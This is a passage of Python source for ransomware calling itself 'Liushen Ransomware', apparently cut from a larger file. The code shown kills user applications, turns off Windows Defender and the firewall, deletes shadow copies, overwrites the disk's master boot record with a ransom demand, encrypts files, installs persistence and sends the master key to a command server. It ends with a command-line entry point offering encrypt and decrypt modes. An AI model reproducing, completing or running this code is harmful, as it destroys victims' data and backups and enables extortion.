                  'notepad', 'wordpad', 'thunderbird', 'msaccess']
        
        killed = 0
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                name = proc.info['name'].lower()
                
                if name in ['svchost.exe', 'services.exe', 'lsass.exe', 'winlogon.exe']:
                    continue
                
                for target in targets:
                    if target in name:
                        proc.terminate()
                        time.sleep(0.1)
                        killed += 1
                        break
            except:
                continue
        
        self.logger.info(f"Killed {killed} processes")
        return killed
    
    def disable_security(self) -> bool:
        self.logger.info("Disabling security")
        
        cmds = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
            'netsh advfirewall set allprofiles state off'
        ]
        
        if self.winapi.is_admin():
            cmds.extend([
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                'sc config WinDefend start= disabled',
                'net stop WinDefend /y'
            ])
        
        success = 0
        for cmd in cmds:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                success += 1
            except:
                pass
        
        return success > 0
    
    def delete_shadows(self):
        cmds = [
            'vssadmin delete shadows /all /quiet',
            'wmic shadowcopy delete'
        ]
        
        for cmd in cmds:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            except:
                continue
    
    def lock_mbr(self) -> bool:
        if not self.winapi.is_admin():
            return False
        
        try:
            msg = f"""
Liushen Ransomware
Pay {self.config.ransom_amount} USD to {self.config.eth_address}
Victim ID: {self.victim_id}
""".encode('utf-16le')[:446]
            
            handle = self.winapi.kernel32.CreateFileW(
                "\\\\.\\PhysicalDrive0",
                0x10000000, 0, None, 3, 0, None
            )
            
            if handle and handle not in [-1, 0]:
                mbr = bytearray(512)
                mbr[:len(msg)] = msg
                mbr[510:512] = b'\x55\xAA'
                
                written = ctypes.c_uint32(0)
                self.winapi.kernel32.WriteFile(
                    handle, bytes(mbr), 512,
                    ctypes.byref(written), None
                )
                self.winapi.kernel32.CloseHandle(handle)
                
                self.logger.info("MBR locked")
                return True
        except:
            pass
        
        return False
    
    def run_encrypt(self) -> Dict:
        self.logger.info("=" * 50)
        self.logger.info("STARTING ENCRYPTION")
        self.logger.info("=" * 50)
        
        try:
            if not self.anti.check():
                return {'status': 'aborted', 'reason': 'analysis_detected'}
            
            is_admin = self.winapi.is_admin()
            
            security = self.disable_security()
            killed = self.kill_processes()
            self.delete_shadows()
            
            if is_admin:
                self.lock_mbr()
            
            encryptor = FileEncryptor(self.master_key, self.logger)
            encrypted, files, failed = encryptor.encrypt_all()
            
            notes = self.note.create(self.victim_id, encrypted)
            self.persist.install()
            self.c2.send(self.victim_id, encrypted, files, self.master_key)
            
            elapsed = time.time() - self.start_time
            
            result = {
                'status': 'success',
                'victim_id': self.victim_id,
                'encrypted': encrypted,
                'failed': len(failed),
                'notes': notes,
                'elapsed': elapsed
            }
            
            self.logger.info("=" * 50)
            self.logger.info("ENCRYPTION COMPLETE")
            for k, v in result.items():
                self.logger.info(f"{k}: {v}")
            
            return result
            
        except Exception as e:
            self.logger.exception("Fatal error")
            return {'status': 'failed', 'error': str(e)}
    
    def run_decrypt(self, key_path: str = None, target: str = None) -> Dict:
        self.logger.info("=" * 50)
        self.logger.info("STARTING DECRYPTION")
        self.logger.info("=" * 50)
        
        try:
            key = None
            if key_path and os.path.exists(key_path):
                with open(key_path, 'rb') as f:
                    key = f.read()
                if len(key) == 32:
                    self.logger.info(f"Key loaded: {key_path}")
            
            if not key:
                key = self._find_key()
            
            if not key:
                return {'status': 'failed', 'reason': 'no_key'}
            
            if not target:
                drives = self.winapi.get_drives()
                target = drives[0] if drives else "C:\\"
            
            decryptor = FileDecryptor(key, self.logger)
            decrypted, failed = decryptor.decrypt_directory(target)
            
            result = {
                'status': 'success',
                'victim_id': self.victim_id,
                'decrypted': decrypted,
                'failed': len(failed),
                'elapsed': time.time() - self.start_time
            }
            
            self.logger.info("=" * 50)
            self.logger.info("DECRYPTION COMPLETE")
            for k, v in result.items():
                self.logger.info(f"{k}: {v}")
            
            return result
            
        except Exception as e:
            self.logger.exception("Fatal error")
            return {'status': 'failed', 'error': str(e)}
    
    def _find_key(self) -> Optional[bytes]:
        paths = [
            os.path.join(tempfile.gettempdir(), '.cache'),
            os.path.expanduser("~"),
            "C:\\"
        ]
        
        for path in paths:
            if not os.path.exists(path):
                continue
            
            try:
                for f in os.listdir(path):
                    if f.startswith('key_') and f.endswith('.bin'):
                        full = os.path.join(path, f)
                        with open(full, 'rb') as fh:
                            key = fh.read()
                        if len(key) == 32:
                            return key
            except:
                continue
        
        return None

# ==================== MAIN ====================
def main():
    print("\nLiushen Ransomware")
    print("Version: GOLD EDITION\n")
    
    if not check_dependencies():
        sys.exit(1)
    
    parser = argparse.ArgumentParser()
    parser.add_argument('-e', '--encrypt', action='store_true', help='Encrypt mode')
    parser.add_argument('-d', '--decrypt', action='store_true', help='Decrypt mode')
    parser.add_argument('-k', '--key', help='Decryption key file')
    parser.add_argument('-p', '--path', help='Target path for decryption')
    parser.add_argument('--debug', action='store_true', help='Debug mode')
    
    args = parser.parse_args()
    
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(0)
    
    try:
        r = LiushenRansomware(debug=args.debug)
        print(f"Victim ID: {r.victim_id}")
        
        if args.encrypt:
            result = r.run_encrypt()
            if result.get('status') == 'success':
                print(f"\nEncryption complete: {result['encrypted']} files")
                sys.exit(0)
            else:
                print(f"\nEncryption failed: {result.get('error', 'Unknown')}")
                sys.exit(1)
        
        elif args.decrypt:
            result = r.run_decrypt(key_path=args.key, target=args.path)
            if result.get('status') == 'success':
                print(f"\nDecryption complete: {result['decrypted']} files")
                sys.exit(0)
            else:
                print(f"\nDecryption failed")
                sys.exit(1)
        
    except KeyboardInterrupt:
        print("\nInterrupted")
        sys.exit(130)
    except Exception as e:
        print(f"\nError: {e}")
        if args.debug:
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
